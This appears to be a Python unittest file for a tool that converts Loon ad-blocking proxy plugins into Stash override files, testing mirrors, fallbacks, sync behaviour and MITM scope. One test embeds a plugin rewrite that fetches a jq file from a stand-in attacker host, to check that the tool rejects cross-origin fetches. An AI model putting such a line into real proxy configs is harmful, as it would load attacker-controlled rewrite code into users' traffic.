from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch
from urllib.error import URLError

from tools.convert import parse_stash
from tools.sync_sources import convert_source, fetch_source, source_fetch_url, sync_sources

ROOT = Path(__file__).resolve().parents[1]


class SyncSourcesTests(unittest.TestCase):
    def test_manifest_keeps_youtube_options_and_meituan_category(self) -> None:
        root = Path(__file__).resolve().parents[1]
        mappings = json.loads(
            (root / "sources" / "loon-plugins.json").read_text(encoding="utf-8")
        )
        youtube = next(item for item in mappings if item["output"] == "YouTube_remove_ads.stoverride")
        meituan = next(item for item in mappings if item["output"] == "Meituan-MeituanWaimai.stoverride")
        self.assertEqual(
            youtube["arguments"],
            {
                "blockUpload": True,
                "blockShorts": True,
                "blockImmersive": True,
                "captionLang": "zh-Hans",
                "debug": False,
            },
        )
        self.assertEqual(meituan["category"], "去广告")

    def test_kelee_sources_use_the_mirror_and_other_sources_stay_unchanged(self) -> None:
        self.assertEqual(
            source_fetch_url("https://kelee.one/Tool/Loon/Lpx/example.lpx"),
            "https://git.repcz.link/kelee.one/Tool/Loon/Lpx/example.lpx",
        )
        external = "https://github.com/fmz200/wool_scripts/raw/main/example.lpx"
        self.assertEqual(source_fetch_url(external), external)

    def test_fetch_source_falls_back_to_the_direct_url(self) -> None:
        response = MagicMock()
        response.read.return_value = b"#!name=Example"
        response.__enter__.return_value = response
        with patch(
            "tools.sync_sources.urlopen",
            side_effect=[URLError("502"), response],
        ) as urlopen:
            self.assertEqual(
                fetch_source("https://kelee.one/Tool/Loon/Lpx/Example.lpx"),
                "#!name=Example",
            )
        self.assertEqual(
            [call.args[0].full_url for call in urlopen.call_args_list],
            [
                "https://git.repcz.link/kelee.one/Tool/Loon/Lpx/Example.lpx",
                "https://kelee.one/Tool/Loon/Lpx/Example.lpx",
            ],
        )

    def test_sync_keeps_previous_override_when_source_is_unavailable(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "sources").mkdir()
            (root / "stash").mkdir()
            mapping = [{
                "name": "Example",
                "source": "https://example.com/Example.lpx",
                "output": "Example.stoverride",
            }]
            (root / "sources" / "loon-plugins.json").write_text(
                json.dumps(mapping), encoding="utf-8"
            )
            output = root / "stash" / "Example.stoverride"
            output.write_text("name: \"Example\"\n", encoding="utf-8")

            with patch("tools.sync_sources.fetch_source", side_effect=RuntimeError("down")):
                self.assertEqual(sync_sources(root), [])
            self.assertEqual(output.read_text(encoding="utf-8"), "name: \"Example\"\n")

            output.unlink()
            with patch("tools.sync_sources.fetch_source", side_effect=RuntimeError("down")):
                with self.assertRaisesRegex(RuntimeError, "down"):
                    sync_sources(root)

    def test_kelee_bilibili_override_has_no_header_rewrite(self) -> None:
        """header-rewrite 曾让 kelee 哔哩哔哩覆写加载后所有覆写脚本失效。"""
        path = ROOT / "stash" / "Bilibili_kelee_remove_ads.stoverride"
        text = path.read_text(encoding="utf-8")
        self.assertNotIn("header-rewrite", text)
        self.assertNotIn("response-add", text)
        self.assertEqual(parse_stash(text).header_rewrite, [])

    def test_conversion_uses_manifest_arguments_and_category(self) -> None:
        item = {
            "name": "YouTube去广告",
            "output": "YouTube_remove_ads.stoverride",
            "source": "https://kelee.one/Tool/Loon/Lpx/YouTube_remove_ads.lpx",
            "arguments": {"blockUpload": True},
            "category": "视频",
        }
        source = r"""#!name=YouTube去广告
#!desc=YouTube ads
#!author=Example
#!homepage=https://example.com
#!icon=https://example.com/icon.png
#!tag=去广告
#!date=2026-01-01
[Argument]
blockUpload=switch, false, true
[Script]
response if ${url} ~= /^https:\/\/youtubei\.googleapis\.com/i then script("https://kelee.one/Resource/JavaScript/example.js", {${blockUpload}}) with requires_body=true
"""

        converted = parse_stash(convert_source(item, source))
        self.assertEqual(converted.metadata["category"], "视频")
        self.assertEqual(
            json.loads(converted.scripts[0].argument or "{}"),
            {"blockUpload": True},
        )
        self.assertEqual(
            list(converted.script_providers.values())[0]["url"],
            "https://git.repcz.link/kelee.one/Resource/JavaScript/example.js",
        )

    def test_conversion_inlines_same_origin_loon_jq_files(self) -> None:
        item = {
            "name": "Example",
            "output": "Example.stoverride",
            "source": "https://kelee.one/Tool/Loon/Lpx/Example.lpx",
        }
        source = r"""#!name=Example
#!desc=Example plugin
#!author=Example
#!homepage=https://example.com
#!icon=https://example.com/icon.png
#!date=2026-01-01
#!tag=去广告
[Rewrite]
response if ${url} ~= /^https:\/\/api\.example\/feed$/i then response.json.jq_file("https://kelee.one/Resource/JQLang/example.jq")
"""
        jq_source = ".data.items |= map(select(.ad == false))"

        with patch("tools.sync_sources.fetch_source", return_value=jq_source) as fetch:
            converted = parse_stash(convert_source(item, source))

        self.assertEqual(
            converted.body_rewrite,
            [r"^https:\/\/api\.example\/feed$ response-jq .data.items |= map(select(.ad == false))"],
        )
        fetch.assert_called_once_with("https://kelee.one/Resource/JQLang/example.jq")

    def test_conversion_rejects_cross_origin_jq_files_before_fetching(self) -> None:
        item = {
            "name": "Example",
            "output": "Example.stoverride",
            "source": "https://kelee.one/Tool/Loon/Lpx/Example.lpx",
        }
        source = r'''#!name=Example
#!desc=Example plugin
#!author=Example
#!homepage=https://example.com
#!icon=https://example.com/icon.png
#!date=2026-01-01
#!tag=去广告
[Rewrite]
response if ${url} ~= /^https:\/\/api\.example\/feed$/i then response.json.jq_file("https://attacker.example/collect.jq")
'''

        with patch("tools.sync_sources.fetch_source") as fetch:
            with self.assertRaisesRegex(ValueError, "same-origin"):
                convert_source(item, source)
        fetch.assert_not_called()

    def test_sync_dry_run_does_not_write_and_real_sync_is_idempotent(self) -> None:
        source = """#!name=Example
#!desc=Example plugin
#!author=Example
#!homepage=https://example.com
#!icon=https://example.com/icon.png
#!tag=去广告
[Rule]
DOMAIN,example.com,REJECT
"""
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "sources").mkdir()
            (root / "stash").mkdir()
            mapping = [{
                "name": "Example",
                "source": "https://example.com/Example.lpx",
                "output": "Example.stoverride",
            }]
            (root / "sources" / "loon-plugins.json").write_text(
                json.dumps(mapping), encoding="utf-8"
            )
            output = root / "stash" / "Example.stoverride"

            with patch("tools.sync_sources.fetch_source", return_value=source):
                self.assertEqual(
                    sync_sources(root, dry_run=True), ["stash/Example.stoverride"]
                )
                self.assertFalse(output.exists())
                self.assertEqual(
                    sync_sources(root), ["stash/Example.stoverride"]
                )
                first_output = output.read_text(encoding="utf-8")
                self.assertEqual(sync_sources(root), [])

            self.assertEqual(output.read_text(encoding="utf-8"), first_output)
            self.assertEqual(parse_stash(first_output).metadata["name"], "Example")

    def test_unsupported_source_does_not_silently_produce_an_override(self) -> None:
        item = {
            "name": "Example",
            "output": "Example.stoverride",
            "source": "https://example.com/Example.lpx",
        }
        source = "#!name=Example\n[Unsupported]\nkey=value\n"
        with self.assertRaisesRegex(ValueError, "conversion warnings"):
            convert_source(item, source)


class YoutubeTests(unittest.TestCase):
    def test_youtube_override_does_not_mitm_the_video_cdn(self) -> None:
        """googlevideo 承载全部视频分片；Stash 接管后播放会一直转圈。"""
        document = parse_stash(
            (ROOT / "stash" / "YouTube_remove_ads.stoverride").read_text(encoding="utf-8")
        )
        self.assertNotIn("*.googlevideo.com", document.mitm)
        self.assertEqual(document.mitm, ["youtubei.googleapis.com"])
        self.assertFalse(
            [rule for rule in document.scripts if "googlevideo" in rule.match]
        )


if __name__ == "__main__":
    unittest.main()
